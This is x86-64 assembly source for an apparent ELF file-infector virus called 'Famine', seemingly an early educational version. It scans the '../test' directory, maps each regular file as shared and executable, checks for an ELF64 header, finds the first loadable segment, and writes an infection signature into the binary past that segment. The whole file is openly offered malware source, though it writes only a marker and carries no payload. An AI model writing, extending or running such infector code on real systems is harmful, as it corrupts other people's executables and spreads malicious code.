%include "famine.inc"

bits 64
default rel

section .text
global _start


_start:

    ; placing famine on the stack
    mov rbp, rsp
    sub rsp, famine_size
    mov rdi, dir1                               ; dir to open for arg readDir
    call _readDir
    jmp _exit

; take directory to open in rdi
_readDir:
    mov rax, SYS_OPEN 
    mov rsi, O_RDONLY | O_DIRECTORY
    xor rdx, rdx
    syscall
    cmp rax, 0
    jl _exit

    mov rdi, rax
    mov rax, SYS_GETDENTS                   	; getdents64(int fd, void *buf, size_t size_buf)
    lea rsi, FAM(famine.dirents)
    mov rdx, PAGE_SIZE
    syscall
    lea r10, FAM(famine.dirents_struct_ptr) 	; r10 -> (struct famine.diretents_struct_ptr)
    mov [r10], rsi          	                ; famine.dirents_struct_ptr -> famine.dirents
    lea r11, FAM(famine.total_to_read)      	; r11 -> (struct famine.total_to_read)
    mov DWORD [r11], eax                        ; famine.total_to_read = getdents total length
    cmp rax, 0
    jle _return

    _listFile:
        lea r8, FAM(famine.total_read)      	; r8 -> total lu de getdents
        lea r9, FAM(famine.total_to_read)       ; r9 -> total a lire de getdents
        mov r10, FAM(famine.dirents_struct_ptr) ; r10 -> actual dirent struct
        lea r11, FAM(famine.dirents_struct_ptr) ; r11 -> ptr de la struct actuelle
        movzx r12, WORD [r10 + D_RECLEN_OFF] 	; r12 = length de la stuct dirents actuelle
        add [r8], r12d                        	; update du total lu dans r8
        add [r11], r12                          ; famine.diretns_struct_ptr -> sur la prochaine struct
        cmp BYTE [r10 + D_TYPE], D_REG_FILE 	; verifie le type du fichier
        jne _checkRead
        lea rsi, [r10 + D_NAME]                 ; charge le nom du fichier dans rsi
		call _check_file

            _checkRead:
                mov r8, FAM(famine.total_read)
                mov r12, FAM(famine.total_to_read)
                cmp r8d, r12d                 	; if (total lu >= total getdents)
                jge _return
                jmp _listFile

_check_file:
	push rbp
	mov	rbp, rsp
    sub rsp, check_file_size

	; === open file ===
	_open_file:
		mov	rax, SYS_OPEN
		mov rdi, rsi
		; lea	rdi, [rel file_name]
		mov rsi, O_RDWR
		xor rdx, rdx 
		syscall
		cmp	rax, 0x0
		jl	_leave_return
		mov CHF(check_file.file_fd), rax

	; === get file size ===
	_get_filesz:
		mov rax, SYS_LSEEK
		mov	rdi, CHF(check_file.file_fd)
		mov	rsi, 0x0
		mov rdx, SEEK_END
		syscall
		; mov r10, rax
		; mov rax, SYS_LSEEK
		; mov rdx, SEEK_SET
		; syscall

	; === mmap file ===
	_map_file:
		mov rsi, rax			; rsi = file_size
		mov rax, SYS_MMAP
		mov	rdi, 0x0
		mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
		mov r10, MAP_SHARED
		mov r8, CHF(check_file.file_fd)
		mov r9, 0x0
		syscall
		cmp	rax, 0x0
		jl _leave_return
		mov CHF(check_file.map), rax		; voir si necessaire

	; === check file format ===
	_check_format:
		cmp	dword [rax + 1], 0x02464c45	; if != 'ELF64'
		jne _leave_return

	; === Find text segment ===
	_fd_txt_seg:
		mov r14, rax								; rax -> elf start addr
		movzx r15, word [r14 + elf64_ehdr.e_phnum]	; r15 = number of segments
		add r14, [r14 + elf64_ehdr.e_phoff]			; r14 -> start of segment headers's table
		xor rcx, rcx								; loop counter
		mov r13, r14								; r13 will point to each phdr
		_segment_loop:
			cmp r15w, cx
			je	_leave_return
			cmp word [r13], PT_LOAD
			je _txt_found
			inc rcx
			add r13, elf64_phdr_size			; r13 -> tab_phdr[rcx].p_type
			jmp _segment_loop
	
	; === found text segment ===
	_txt_found:
		add r13, [r13 + elf64_phdr.p_filesz]	; jmp to potential injection addr
		; inc r13								; Voir si necessaire
	; === check if infected ===
		lea r12, signature
		mov rax, [r12]
		cmp rax, qword [r13]
		je	_leave_return
	; === Infection ===
		push rcx
		xor rcx, rcx
		_strcpy_loop:
			cmp byte [r12 + rcx], 0
			je	_strcpy_loop_end
			mov al, byte [r12 + rcx]
			mov [r13 + rcx], al
			inc rcx
			jmp _strcpy_loop
		_strcpy_loop_end:
		pop rcx	
		jmp _leave_return
	; *** pas obligatoire ***
	_close_file:
		mov	rax, qword 0x3
		mov	rdi, CHF(check_file.file_fd)
		syscall
		jmp _leave_return

_leave_return:
	leave
	ret

_return:
    ret

_exit:
    mov rax, 60
    xor rdi, rdi
    syscall

dir1        db  "../test", 0
open        db  "It worked", 10, 0
file_name	db	"sample64", 0x0
signature	db	"Famine version 1.0 (c)oded by anvincen-eedy"